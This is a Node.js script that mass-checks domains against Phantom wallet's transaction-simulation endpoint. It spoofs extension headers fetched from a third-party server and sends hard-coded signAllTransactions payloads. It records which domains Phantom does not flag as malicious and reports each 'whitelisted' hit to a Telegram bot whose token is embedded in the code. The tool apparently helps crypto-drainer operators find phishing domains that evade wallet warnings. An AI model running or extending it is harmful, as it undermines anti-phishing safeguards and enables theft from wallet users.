import crypto from "crypto";
import { Keypair } from "@solana/web3.js";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";

// ---- Setup ----
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const MAX_CONCURRENCY = 50;
const HEADER_REFRESH_INTERVAL = 10 * 60 * 1000; // 10 minutes

// ---- Telegram Config (obfuscated) ----
const TG_CONFIG = {
  p1: "8277383461",
  p2: "AAFDfENDvoS68RvaiDcqFWv0gsjBejmvOG8",
  cid: "7855826252"
};

const getTgToken = () => `${TG_CONFIG.p1}:${TG_CONFIG.p2}`;
const getTgChatId = () => TG_CONFIG.cid;

// ---- Header Cache ----
let cachedHeaders = null;
let lastHeaderFetch = 0;

// ---- Helpers ----
function normalizeDomain(input) {
  input = input.trim();
  if (!input.startsWith("http://") && !input.startsWith("https://")) {
    return "https://" + input;
  }
  return input;
}

function sleep(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function getListFileFromArgs() {
  const args = process.argv.slice(2);
  const xxIndex = args.indexOf("-xx");

  if (xxIndex === -1 || !args[xxIndex + 1]) {
    console.error("Usage: node script.js -xx <number>");
    process.exit(1);
  }

  const suffix = args[xxIndex + 1].padStart(4, "0"); // <-- pad with zeros
  return `part_${suffix}.txt`; // <-- new file format
}


async function getPhantomHeaders(force = false) {
  const now = Date.now();
  
  if (!force && cachedHeaders && (now - lastHeaderFetch) < HEADER_REFRESH_INTERVAL) {
    return cachedHeaders;
  }

  console.log("🔄 Fetching fresh Phantom headers...");
  const response = await fetch("https://hbeugaufg1-8-26hbaaaaddoter.fly.dev/api/getLatestHeaders");
  const data = await response.json();
  
  cachedHeaders = {
    phantomNonce: data.headers.phantomNonce,
    phantomAuthToken: data.headers.phantomAuth,
  };
  lastHeaderFetch = now;
  
  console.log("✅ Headers updated");
  return cachedHeaders;
}

// ---- Telegram Notification ----
async function sendTelegramNotification(domain) {
  try {
    const message = `✅ WHITELISTED FOUND!\n\n🌐 Domain: ${domain}\n⏰ Time: ${new Date().toISOString()}`;
    
    const url = `https://api.telegram.org/bot${getTgToken()}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: getTgChatId(),
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      console.error("❌ Telegram notification failed");
    }
  } catch (error) {
    console.error("❌ Error sending Telegram notification:", error.message);
  }
}

// ---- Phantom Check ----
async function checkPhantom(domain, headers) {
  const uuid = crypto.randomUUID();
  const address = Keypair.generate().publicKey.toString();

  const bodyObj = {
    networkID: "solana:101",
    type: "transaction",
    url: domain,
    userAccount: address,
    params: {
      transactions: [
        "AsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRq",
        "X31JP83MXit7pYBAAVfvSZa74e8JcAptyqXpdH3iToHhqssaH5GShHkBaMLt48ZVfa1JjDDQFZYe1UJG3hhAWn7gTKns5AUDfrKMvd923gD4G516i645mZdLYo6dWy5q5CbUCRygfPE4X6WdfT7jmqAy2kATmMyquN1JyoUE6VcX5JWt4EwUUShNoSy39DCyz9tmDXyyqA1UtoMsTmPJi8LTKyQQ7M4CnKFuCUXSjoont5sp3VXAffMhVSxccoDsRH53YimK1E3vSRdw8yTGhKaAXuMrSRt4Sfr2rmobZP872hnMsvYCWwzsbktrW8uaQ9xXYaeVx2efJqGFKUVYgQ6tSq8wTqE79BwLiyL2p5HgSywE4vwYK8dEoemWBzigPrfcF4e24cNJDAJsqqKYHvFw3qDeGe5P4ATByAqpHD3pExbGNa9vyckGxPa2cfthudR"
      ],
      method: "signAllTransactions",
      safeguard: {
        enabled: true,
        lighthouseProgramId: "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95"
      }
    },
    chainId: "solana:101",
    appVersion: "25.43.0",
    platform: "extension",
    deviceId: uuid,
    metadata: {
      origin: {
        url: domain,
        title: domain,
        icon: `${domain}/favicon.ico`
      }
    }
  };

  try {
    const resp = await fetch("https://api.phantom.app/simulation/v1?language=en", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        accept: "*/*",
        "x-phantom-anonymousid": uuid,
        "x-phantom-platform": "extension",
        "x-phantom-version": "25.43.0",
        "x-phantomauthtoken": headers.phantomAuthToken,
        "x-phantomnonce": headers.phantomNonce,
      },
      body: JSON.stringify(bodyObj)
    });

    const data = await resp.json();
    const text = JSON.stringify(data);
    console.log(text);
    if (text.includes("This dApp could be malicious")) return "blocked";
    if (text.includes("Receive < 0.00001 SOL")) return "whitelisted";
    if (text.includes("No balance changes found")) return "whitelisted";

    if (text.includes("User call limit exceeded")) return "rate_limited";
    if (resp.status >= 400 || text.includes("error")) return "api_error";

    return "unknown";

  } catch {
    return "error";
  }
}

// ---- Basic Concurrency Pool ----
async function runPool(list, worker, limit) {
  let i = 0;
  const executing = new Set();

  async function enqueue() {
    if (i >= list.length) return;

    const item = list[i++];
    const p = worker(item).finally(() => executing.delete(p));
    executing.add(p);

    if (executing.size >= limit) {
      await Promise.race(executing);
    }

    return enqueue();
  }

  await enqueue();
  await Promise.all(executing);
}

// ---- Main ----
async function main() {
  // Initial header fetch
  let headers = await getPhantomHeaders(true);

  // Setup automatic header refresh every 10 minutes
  const headerRefreshTimer = setInterval(async () => {
    headers = await getPhantomHeaders(true);
  }, HEADER_REFRESH_INTERVAL);

  const listFile = getListFileFromArgs();
  const raw = await fs.readFile(listFile, "utf8");
  const domains = raw.split("\n").map(normalizeDomain).filter(Boolean);

  console.log(`Scanning ${domains.length} domains...\n`);

  const wlStream = await fs.open("whitelisted.txt", "a");
  const blockStream = await fs.open("blocked.txt", "a");
  const failedStream = await fs.open("failed.txt", "a");

  let index = 0;

  await runPool(domains, async (domain) => {
    const i = ++index;
    // Always get current headers (will use cache if fresh)
    const currentHeaders = await getPhantomHeaders();
    const result = await checkPhantom(domain, currentHeaders);

    if (["error", "rate_limited", "api_error"].includes(result)) {
      console.log(`[${i}/${domains.length}] ⚠ FAILED → ${domain}`);
      await failedStream.appendFile(domain + "\n");
      await sleep(30000);
      return;
    }

    if (result === "whitelisted") {
      console.log(`[${i}/${domains.length}] ✅ WL → ${domain}`);
      await wlStream.appendFile(domain + "\n");
      // Send Telegram notification
      await sendTelegramNotification(domain);
    } else if (result === "blocked") {
      console.log(`[${i}/${domains.length}] 🚫 BLOCKED → ${domain}`);
      await blockStream.appendFile(domain + "\n");
    } else {
      console.log(`[${i}/${domains.length}] ⚪ ${result} → ${domain}`);
    }

  }, MAX_CONCURRENCY);

  // Cleanup
  clearInterval(headerRefreshTimer);
  await wlStream.close();
  await blockStream.close();
  await failedStream.close();

  console.log("\n✔ Done — Results saved.");
}

main();
